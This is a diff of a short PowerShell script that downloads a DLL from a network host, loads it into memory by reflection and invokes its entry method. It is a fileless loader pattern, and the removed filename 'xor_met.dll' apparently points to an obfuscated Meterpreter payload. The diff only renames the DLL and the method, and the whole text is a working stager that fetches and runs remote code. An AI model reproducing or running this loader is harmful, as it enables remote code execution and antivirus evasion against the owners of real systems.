@@ -1,6 +1,6 @@
-$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.102/xor_met.dll')
+$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.102/ClassLibrary1.dll')
 
 $assem = [System.Reflection.Assembly]::Load($data)
 $class = $assem.GetType("ClassLibrary1.Class1")
-$method = $class.GetMethod("runner")
+$method = $class.GetMethod("Runner")
 $method.Invoke(0, $null)
